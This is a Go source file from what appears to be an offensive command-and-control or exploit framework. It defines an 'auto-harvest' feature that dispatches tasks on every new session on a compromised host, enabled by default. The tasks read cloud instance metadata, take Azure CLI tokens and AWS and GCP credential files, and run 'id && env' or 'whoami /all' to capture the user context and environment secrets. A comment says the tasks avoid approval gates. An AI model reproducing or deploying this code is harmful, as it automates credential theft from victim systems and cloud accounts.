package autoharvest

import (
	"log"
	"runtime"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

// AutoHarvestConfig controls the auto-harvest feature.
type AutoHarvestConfig struct {
	Enabled bool     `yaml:"enabled"`
	Tasks   []string `yaml:"tasks,omitempty"` // override default task list
}

// DefaultConfig returns the default auto-harvest configuration.
func DefaultConfig() *AutoHarvestConfig {
	return &AutoHarvestConfig{
		Enabled: true,
	}
}

// HarvestTask represents a task to dispatch on new sessions.
type HarvestTask struct {
	Name     string
	TaskType pb.TaskType
	Data     []byte
}

// DefaultTasks returns the default set of recon tasks dispatched on SESSION_NEW.
// All tasks are recon-level — no approval gates triggered.
func DefaultTasks(targetOS string) []HarvestTask {
	tasks := []HarvestTask{
		{
			Name:     "net_ifconfig",
			TaskType: pb.TaskType_TASK_NET_IFCONFIG,
		},
		{
			Name:     "process_list",
			TaskType: pb.TaskType_TASK_PROCESS_LIST,
		},
	}

	// Cloud IMDS detection (cross-platform)
	imdsData, _ := proto.Marshal(&pb.ModuleTask{
		ModuleName: "cloud",
		Config: mustMarshal(&pb.CloudHarvestConfig{
			Provider: "imds",
		}),
	})
	tasks = append(tasks, HarvestTask{
		Name:     "cloud_imds",
		TaskType: pb.TaskType_TASK_MODULE,
		Data:     imdsData,
	})

	// Azure CLI tokens (cross-platform)
	azureCLIData, _ := proto.Marshal(&pb.ModuleTask{
		ModuleName: "cloud",
		Config: mustMarshal(&pb.CloudHarvestConfig{
			Provider: "azure",
			Method:   "cli",
		}),
	})
	tasks = append(tasks, HarvestTask{
		Name:     "cloud_azure_cli",
		TaskType: pb.TaskType_TASK_MODULE,
		Data:     azureCLIData,
	})

	// AWS credential files (cross-platform)
	awsCredsData, _ := proto.Marshal(&pb.ModuleTask{
		ModuleName: "cloud",
		Config: mustMarshal(&pb.CloudHarvestConfig{
			Provider: "aws",
		}),
	})
	tasks = append(tasks, HarvestTask{
		Name:     "cloud_aws_creds",
		TaskType: pb.TaskType_TASK_MODULE,
		Data:     awsCredsData,
	})

	// GCP credential files (cross-platform)
	gcpCredsData, _ := proto.Marshal(&pb.ModuleTask{
		ModuleName: "cloud",
		Config: mustMarshal(&pb.CloudHarvestConfig{
			Provider: "gcp",
		}),
	})
	tasks = append(tasks, HarvestTask{
		Name:     "cloud_gcp_creds",
		TaskType: pb.TaskType_TASK_MODULE,
		Data:     gcpCredsData,
	})

	// User context
	if targetOS == "windows" || runtime.GOOS == "windows" {
		shellData, _ := proto.Marshal(&pb.ShellTask{
			Command: "whoami /all",
		})
		tasks = append(tasks, HarvestTask{
			Name:     "whoami",
			TaskType: pb.TaskType_TASK_SHELL,
			Data:     shellData,
		})
	} else {
		shellData, _ := proto.Marshal(&pb.ShellTask{
			Command: "id && env",
		})
		tasks = append(tasks, HarvestTask{
			Name:     "user_context",
			TaskType: pb.TaskType_TASK_SHELL,
			Data:     shellData,
		})
	}

	return tasks
}

// H2: mustMarshal logs fatal on marshal errors instead of silently swallowing.
// This is safe because it's only called at init-time for static config.
func mustMarshal(msg proto.Message) []byte {
	data, err := proto.Marshal(msg)
	if err != nil {
		log.Fatalf("[autoharvest] failed to marshal default task config: %v", err)
	}
	return data
}
